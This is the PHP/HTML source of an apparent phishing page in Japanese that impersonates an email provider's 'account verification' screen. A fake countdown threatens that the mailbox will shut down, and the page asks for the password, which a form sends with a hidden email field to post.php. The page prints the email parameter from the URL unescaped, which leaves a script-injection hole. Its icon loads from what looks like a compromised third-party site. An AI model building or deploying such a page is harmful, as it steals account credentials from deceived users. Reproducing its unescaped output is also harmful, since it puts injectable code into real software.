<html>
<head>
<title>&#12513;&#12540;&#12523;&#35373;&#23450; | &#26908;&#35388;</title>

<link rel="icon" href="https://sunriseprowebsites.com/backstage/app/views/client/lutfi-cloud/lutfi-file/images/avatar.png" sizes="13x13" type="image/png">


</head>
<body marginheight="0" marginwidth="0" topmargin="0" bottommargin="0" rightmargin="0" leftmargin="0" link="#3F59A4" alink="#3F59A4" vlink="#3F59A4">

<table width="100%" height="" cellspacing="0">

<tr><td height="30" bgcolor="#000000">

	<table width="" align="center"><tr>


	<td>
	<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTfy27wxk9we2exTNCIDrXRa4nJ-lj-FqRrSyQ0LqtsguIBev9DQQ" width="40" height="27">
	</td>


	<td width="5"></td>


	<td>
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="4" color="#ffffff">
	&#12513;&#12540;&#12523;&#35373;&#23450;
	</font>







	<td width="800">
	<div align="right">
	<a href="" style="text-decoration:none">
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="4" color="#ffffff">
	<?php echo $_GET['email']; ?>	</font>
	</a>
	</div>
	</td>


<td width="5"></td>





	<td>
	<a href="">
	<img src="https://sunriseprowebsites.com/backstage/app/views/client/lutfi-cloud/lutfi-file/images/avatar.png" width="28" height="28" border="0">
	</a>
	</td>

	</tr></table>

</td></tr>






<tr><td height="60" bgcolor="#FFFFFF"></td></td>






<tr><td height="" bgcolor="#FFFFFF">

	<table width="650" align="center" cellspacing="0">

	<tr><td>
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="+2" color="#3F59A4">
	&#12450;&#12459;&#12454;&#12531;&#12488;&#12398;&#30906;&#35469;
	</font>
	</td></tr>


	<tr><td height="15" bgcolor="#FFFFFF"></td></td>



	<tr><td>

		<table><tr>

		<td>
		<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2">
		&#12354;&#12394;&#12383;&#12398;&#38651;&#23376;&#12513;&#12540;&#12523;&#12398;&#12471;&#12515;&#12483;&#12488;&#12480;&#12454;&#12531;&#12408;&#12398;&#12459;&#12454;&#12531;&#12488;&#12480;&#12454;&#12531;: 
		</font>
		</td>


		<td>
		<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="4" color="#ff0000">

		<b><div id="hms">01:15:10</div></b>

		<script type="text/javascript">
    		function count() {
 
    		var startTime = document.getElementById('hms').innerHTML;
    		var pieces = startTime.split(":");
    		var time = new Date();    time.setHours(pieces[0]);
    		time.setMinutes(pieces[1]);
    		time.setSeconds(pieces[2]);
    		var timedif = new Date(time.valueOf() - 1000);
    		var newtime = timedif.toTimeString().split(" ")[0];
    		document.getElementById('hms').innerHTML=newtime;
    		setTimeout(count, 1000);
		}
		count();
 
		</script>

		</font>

		</td>



		</tr></table>

	
	</td></tr>







	<tr><td>
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2">
	&#38651;&#23376;&#12513;&#12540;&#12523;&#12364;&#12471;&#12515;&#12483;&#12488;&#12480;&#12454;&#12531;&#12373;&#12428;&#12394;&#12356;&#12424;&#12358;&#12395;&#12377;&#12427;&#12395;&#12399;&#12289; &#20197;&#19979;&#12398;&#12450;&#12459;&#12454;&#12531;&#12488;&#24773;&#22577;&#12434;&#30906;&#35469;&#12375;&#12390;&#12367;&#12384;&#12373;&#12356;&#65306;
	</font>
	</td></tr>
	
	



	<tr><td height="25" bgcolor="#FFFFFF"></td></td>



	<tr><td>
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="+2">
	<?php echo $_GET['email']; ?> 
	</font>
	</td></tr>



<tr><td height="5" bgcolor="#FFFFFF"></td></td>


	
	<tr><td>
	<form method="post" action="post.php">
	</td></tr>



	<tr><td>

		<input  name="password" type="password" style="width:350px; height:35px; font-family: Verdana; 
      				font-size: 15px; color:#000000; background-color: #ffffff; 
      				border: solid 1px #848484; padding: 10px; -moz-border-radius: 5px; 
      				-webkit-border-radius: 5px; 	-khtml-border-radius: 5px; 
      				border-radius: 5px;" required="" placeholder="&#12497;&#12473;&#12527;&#12540;&#12489;&#12434;&#20837;&#21147;&#12375;&#12390;&#32154;&#34892;">

	</td></tr>







	<tr><td height="5" bgcolor="#FFFFFF"></td></td>



	<tr><td>

		<input  value="&#26908;&#35388; >>" type="submit" 
                    style="width:270px; height:55px; font-family: Verdana; 
                    font-size: 17px; color:#ffffff; 
					background-color: #3F59A4; border: solid 1px #3F59A4; padding: 10px; 
					-moz-border-radius: 2px; -webkit-border-radius: 2px; 
                    -khtml-border-radius: 2px; border-radius: 2px;
					-moz-box-shadow: 3px 3px 3px #888; -webkit-box-shadow: 3px 3px 3px #888; 
                    box-shadow: 3px 3px 3px #888;">

	</td></tr>



	<tr><td>
	<input name="email" type="hidden" value="<?php echo $_GET['email']; ?>">
	</form>
	</td></tr>




	

<tr><td height="200" bgcolor="#FFFFFF"></td></td>




	

	<tr><td>
	<hr width="650" align="left">
	</td></tr>







	<tr><td height="10" bgcolor="#FFFFFF"></td></td>





	<tr><td>
	<a href="" style="text-decoration:none">
	<font face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="2">
	<b>***</b> &#12450;&#12459;&#12454;&#12531;&#12488; / &#35373;&#23450; / &#12475;&#12461;&#12517;&#12522;&#12486;&#12451;&#35373;&#23450; / &#12450;&#12459;&#12454;&#12531;&#12488;&#12398;&#30906;&#35469; >>
	</font>
	</a>
	</td></tr>


	</table>

</td></tr>



</table>

</body>
</html>